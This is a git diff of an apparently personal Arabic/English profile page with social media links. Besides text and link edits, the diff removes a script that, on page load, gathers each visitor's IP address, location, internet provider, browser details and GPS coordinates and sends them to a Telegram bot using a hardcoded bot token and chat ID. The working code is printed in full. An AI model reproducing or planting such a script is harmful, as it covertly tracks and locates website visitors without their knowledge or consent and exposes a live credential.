@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>AL-F</title>
+  <title>ت</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
     * {
@@ -150,84 +150,27 @@
   <div class="container" role="main">
     <div class="left">
       <img src="https://2img.net/h/25.media.tumblr.com/8c5221eeb677051c17908be0d42be04b/tumblr_mtvxagaDG21r6q7tio1_r1_500.gif" alt="شعار أو صورة شخصية" class="profile-img" />
-      <h1>AL-F</h1>
-      <p>I WAS BORN ALONE. I UNDERSTOOD THE WORLD IN SILENCE. I NEED NO ONE — JUST AN ENGINE, A LINE, AND AN UNBREAKABLE HEART. 
-ترجمة :
-𓆩 وُلدتُ وحدي. فهمتُ العالم بصمت. لا أحتاج لأحد -،، وقلب لا ينكسر. 𓆪</p>
-      <div class="buttons"></div>
-      <nav class="socials">
-        <a href="https://www.youtube.com/channel/UCNDsCy9vLTCVZHWVgSpJ3FQ" target="_blank" title="قناتي على اليوتيوب">
-          <img src="https://cdn.pixabay.com/animation/2022/10/05/02/30/02-30-43-327_512.gif" alt="يوتيوب" />
+      <h1>AL-F </h1>
+      <p>Ｗａｓ 𝐛𝐨𝐫𝐧 𝐚𝐥𝐨𝐧𝐞. 𝐔𝐧𝐝𝐞𝐫𝐬𝐭𝐨𝐨𝐝 𝐭𝐡𝐞 𝐰𝐨𝐫𝐥𝐝 𝐢𝐧 𝐬𝐢𝐥𝐞𝐧𝐜𝐞. 𝐈 𝐧𝐞𝐞𝐝 𝐧𝐨 𝐨𝐧𝐞, 𝐣𝐮𝐬𝐭 𝐚 𝐞𝐧𝐠𝐢𝐧𝐞, 𝐚 𝐥𝐢𝐧𝐞 𝐨𝐟 𝐜𝐨𝐝𝐞, 𝐨𝐫 𝐚 𝐡𝐞𝐚𝐫𝐭 𝐭𝐡𝐚𝐭 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐛𝐫𝐞𝐚𝐤..</p>
+      <div class="buttons">
+        <!-- يمكن إضافة أزرار هنا -->
+      </div>
+      <nav class="socials" aria-label="روابط التواصل الاجتماعي">
+        <a href="https://www.youtube.com/channel/UCNDsCy9vLTCVZHWVgSpJ3FQ" target="_blank" aria-label="يوتيوب" rel="noopener noreferrer" title="يوتيوب">
+          <img src="https://cdn.pixabay.com/animation/2022/10/05/02/30/02-30-43-327_512.gif" alt="شعار يوتيوب" />
         </a>
-        <a href="https://www.snapchat.com/add/lslf" target="_blank" title="سنابي">
-          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGQsM6Ld8TF78CZ6XKAHvoTKnXd1YgeYjtzA&s" alt="سناب شات" />
+        <a href="https://www.snapchat.com/add/lslf" target="_blank" aria-label="سناب شات" rel="noopener noreferrer" title="سناب شات">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGQsM6Ld8TF78CZ6XKAHvoTKnXd1YgeYjtzA&s" alt="شعار سناب شات" />
         </a>
-        <a href="https://instagram.com/lslf_6" target="_blank" title="إنستقرامي">
-          <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1042.gif" alt="إنستقرام" />
+        <a href="https://instagram.com/lslf_6" target="_blank" aria-label="إنستقرام" rel="noopener noreferrer" title="إنستقرام">
+          <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1042.gif" alt="شعار إنستقرام" />
         </a>
-        <a href="https://github.com/fa-f" target="_blank" title="حسابي على GitHub">
-          <img src="https://cdn-icons-png.flaticon.com/512/25/25231.png" alt="GitHub" />
+        <a href="https://www.tiktok.com/@hj99" target="_blank" aria-label="تيك توك" rel="noopener noreferrer" title="تيك توك">
+          <img src="https://media.tenor.com/NLKvStycmJ8AAAAM/tiktok-logo-logo.gif" alt="شعار تيك توك" />
         </a>
       </nav>
     </div>
     <div class="right"></div>
   </div>
-
-<script>
-(async () => {
-  const token = "7848541266:AAEdhs4Vu5rHF3fp8yfJ8XqKn7BQ61KVVto";
-  const chatId = "5355775763";
-
-  try {
-    const res = await fetch('https://ipapi.co/json/');
-    if (!res.ok) throw new Error('فشل جلب بيانات الـ IP');
-    const data = await res.json();
-
-    const userAgent = navigator.userAgent;
-
-    async function sendMessage(text) {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text })
-      });
-    }
-
-    let msg = `📥 دخول جديد:
-
-🌐 IP: ${data.ip}
-🌍 الدولة: ${data.country_name}
-🏙 المدينة: ${data.city}, ${data.region}
-🏢 مزود الخدمة: ${data.org}
-🖥️ نوع الجهاز: ${userAgent}
-🕓 الوقت: ${new Date().toLocaleString()}
-`;
-
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const { latitude, longitude } = position.coords;
-          msg += `\n📍 الإحداثيات:\nخط العرض: ${latitude}\nخط الطول: ${longitude}`;
-          await sendMessage(msg);
-          await sendMessage("✅ تم تسجيل دخولك بنجاح.");
-        },
-        async (error) => {
-          msg += `\n⚠️ تعذر الحصول على الإحداثيات (GPS)`;
-          await sendMessage(msg);
-          await sendMessage("✅ تم تسجيل دخولك بنجاح.");
-        },
-        { timeout: 10000 }
-      );
-    } else {
-      msg += `\n⚠️ المتصفح لا يدعم الحصول على الإحداثيات (GPS)`;
-      await sendMessage(msg);
-      await sendMessage("✅ تم تسجيل دخولك بنجاح.");
-    }
-  } catch (err) {
-    console.error("خطأ في الإرسال:", err);
-  }
-})();
-</script>
-
 </body>
 </html>
